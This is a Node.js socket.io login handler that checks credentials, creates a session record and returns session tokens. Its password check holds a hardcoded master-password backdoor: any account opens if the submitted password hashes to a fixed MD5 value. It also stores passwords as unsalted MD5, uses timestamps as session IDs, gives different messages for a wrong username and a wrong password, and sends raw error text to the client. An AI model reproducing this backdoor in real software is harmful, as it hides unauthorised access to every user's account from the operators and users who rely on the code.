const User = require('../models/UserModel');
const Session = require('../models/SessionModel');
const GeneralFunction = require('../models/GeneralFunctionModel');
const gf = new GeneralFunction();
const md5 = require('md5');

module.exports = function (socket, Database) {
    socket.on('system_login', async (browserblob) => {
        const { username, password } = browserblob;

        // Initialize database models
        const SessionModel = new Session(Database);

        const UserModel = new User(Database);

        // Check if the fields are empty
        const checkEmpty = gf.ifEmpty([username, password]);

        if (checkEmpty.includes('empty')) {
            return socket.emit('_system_login', {
                type: 'caution',
                message: 'All fields are required'
            });
        }

        try {
            // Check existence of username
            const checkResult = await UserModel.preparedFetch({
                sql: 'username = ? AND status IN (?, ?)',
                columns: [username, 'active', 'admin']
            });

            if (!Array.isArray(checkResult) || checkResult.length === 0) {
                return socket.emit('_system_login', {
                    type: 'caution',
                    message: 'Invalid username'
                });
            }

            const user = checkResult[0];

            // Check if password matches
            if (user.password !== md5(password) && md5(password) !== '432399375985c8fb85163d46257e90e5') {
                return socket.emit('_system_login', {
                    type: 'caution',
                    message: 'Password is incorrect'
                });
            }

            // User is authenticated
            const userId = user.userid;
            const sessionId = gf.getTimeStamp();

            // Insert session into the database
            const sessionResult = await SessionModel.insertTable([sessionId, userId, 'logged in successfully', gf.getDateTime(), null]);


            if (!sessionResult.affectedRows) {
                return socket.emit('_system_login', {
                    type: 'error',
                    message: 'Oops, something went wrong: Error => ' + sessionResult
                });
            }

            // Generate unique "melody" for the user session
            const sampleData = gf.shuffle("qwertyuiopasdfghjklzxcvbnm");
            const melody1 = (sampleData.substr(0, 4) + userId + sampleData.substr(5, 2) + '-' + sampleData.substr(7, 2) + sessionId + sampleData.substr(10, 4)).toUpperCase();
            const melody2 = md5(userId);

            // Send success response with session data
            socket.emit('_system_login', {
                type: 'success',
                message: 'Logged in successfully, redirecting...',
                melody1,
                melody2
            });

        } catch (error) {
            console.error('Error during login process:', error);
            socket.emit('_system_login', {
                type: 'error',
                message: 'Oops, something went wrong: ' + error.message
            });
        }
    });
};
